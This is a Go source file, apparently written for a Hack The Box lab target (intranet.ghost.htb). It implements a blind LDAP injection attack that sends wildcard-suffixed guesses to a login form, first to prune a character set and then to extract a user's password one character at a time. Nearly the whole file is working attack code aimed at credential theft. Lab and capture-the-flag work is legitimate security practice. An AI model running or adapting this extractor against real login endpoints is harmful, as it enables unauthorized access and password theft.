package main

import (
	"fmt"
	"strconv"
)

// Create ldap-injector opbject using the interface defined below
type LdapInjector struct {
	Client  Injector
	Charset string
}

// Initialize ldap-injector properties
func NewLdapInjector(client Injector) *LdapInjector {
	return &LdapInjector{
		Client:  client,
		Charset: CreateCharset(),
	}
}

// Test if a character (plus whatever was validated before it) is valid
func (li *LdapInjector) TestCharacter(prefix string) (string, error) {
	for _, c := range li.Charset {
		if ok, err := li.Client.Do(fmt.Sprintf("%s%s*", prefix, string(c))); err != nil {
			return "", err
		} else if ok {
			return string(c), nil
		}
	}

	return "", nil
}

// Go through each character and save positive results
func (li *LdapInjector) Brute() (string, error) {
	var result string
	for {
		c, err := li.TestCharacter(result)
		if err != nil {
			return "", err
		}
		if c == "" {
			if ok, err := li.Client.Do(result); err != nil {
				return "", err
			} else if !ok {
				return "", fmt.Errorf("partial password found: %s", result)
			}
			break
		}
		result += c
	}
	return result, nil
}

// Eliminate from charset characters that are not in the password
func (li *LdapInjector) PruneCharset() error {
	var newCharset string
	for _, char := range li.Charset {
		if ok, err := li.Client.Do(fmt.Sprintf("*%s*", string(char))); err != nil {
			return err
		} else if ok {
			newCharset += string(char)
		}
	}
	li.Charset = newCharset
	return nil
}

// Interface so we don't need to hardcode the ldap type
type Injector interface {
	Do(password string) (bool, error)
}

func CreateCharset() string {
	var charset string
	for c := 'a'; c <= 'z'; c++ {
		charset += string(c)
	}
	for i := range 10 {
		c := strconv.Itoa(i)
		charset += string(c)
	}
	return charset
}

func main() {

	httpClient := NewFastHttpBruteImpl("POST", "http://intranet.ghost.htb:8008/login", "gitea_temp_principal", 303,
		map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
			"Next-Action":  "c471eb076ccac91d6f828b671795550fd5925940",
		},
	)
	c := NewLdapInjector(httpClient)
	fmt.Println("Charset:", c.Charset)
	fmt.Println("Testing characters to reduce possibilities...")
	c.PruneCharset()
	fmt.Println("Pruned Charset:", c.Charset)
	fmt.Println("Starting brute force...")
	password, err := c.Brute()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	fmt.Println("Success! Password:", password)
}

